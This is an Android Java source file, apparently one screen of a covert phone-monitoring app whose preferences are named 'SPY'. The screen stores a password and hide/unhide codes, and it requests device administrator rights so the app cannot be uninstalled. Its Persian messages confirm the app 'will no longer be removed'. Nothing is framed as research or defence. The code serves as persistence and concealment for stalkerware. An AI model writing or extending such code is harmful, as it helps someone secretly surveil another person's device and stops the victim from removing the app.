package com.example.remote;



import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.EditText;
import android.widget.Toast;

public class pass extends Activity {
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.pass_change);
		final SharedPreferences pref = getSharedPreferences("SPY", 0);
		
		final EditText et_pass = (EditText) findViewById(R.id.pass_edi);
		final EditText et_hide = (EditText) findViewById(R.id.hidden_ed);
		final EditText et_unhide = (EditText) findViewById(R.id.unhide_ed);
		
		final CheckBox ch = (CheckBox) findViewById(R.id.unistall_ch);
		
		et_pass.setText(pref.getString("pass", ""));
		et_hide.setText(pref.getString("hide", ""));
		et_unhide.setText(pref.getString("unhide", ""));
		
		ch.setChecked(pref.getBoolean("unistall", false));
		
		Button bt = (Button)findViewById(R.id.active_pass);
		bt.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				if(!et_pass.getText().toString().equals(""))
					pref.edit().putString("pass", et_pass.getText().toString()).commit();
				if(!et_hide.getText().toString().equals(""))
					pref.edit().putString("hide", et_hide.getText().toString()).commit();
				if(!et_unhide.getText().toString().equals(""))
					pref.edit().putString("unhide", et_unhide.getText().toString()).commit();
				Toast.makeText(pass.this, "تغییرات انجام شد", Toast.LENGTH_SHORT).show();
			}
		});
		
		ch.setOnCheckedChangeListener(new OnCheckedChangeListener() {
			
			@Override
			public void onCheckedChanged(CompoundButton arg0, boolean arg1) {
				// TODO Auto-generated method stub
				if(arg1)
					enableDeviceAdministration();
				else disableDeviceAdministration();
				
				pref.edit().putBoolean("unistall", arg1).commit();
			}
		});
	}
	
	public void enableDeviceAdministration()
	  {
	    DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)getSystemService("device_policy");
	    ComponentName localComponentName = new ComponentName(pass.this, DeviceAdminConfig.class);
	    if (!localDevicePolicyManager.isAdminActive(localComponentName))
	    {
	    	
	      Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
	      localIntent.putExtra("android.app.extra.DEVICE_ADMIN", localComponentName);
	      localIntent.putExtra("android.app.extra.ADD_EXPLANATION", getString(R.string.my));
	      Log.e("#######", "@@@@@@@@");
	      startActivityForResult(localIntent, 12);
	    }
	  }
	
	protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
	  {
	    switch (paramInt1)
	    {
	    	case 12:
	    	default:
	  	      super.onActivityResult(paramInt1, paramInt2, paramIntent);
	    }
	      if (paramInt2 == -1)
	      {
	        Toast.makeText(this, "دیگر برنامه پاک نمی شود !", 0).show();
	      }
	      else
	      {
	        Toast.makeText(this, "برنامه پاک می شود !", 0).show();
	      }
	  }
	
	public void disableDeviceAdministration()
	  {
	    ((DevicePolicyManager)getSystemService("device_policy")).removeActiveAdmin(new ComponentName(this, DeviceAdminConfig.class));
	  }
	

}
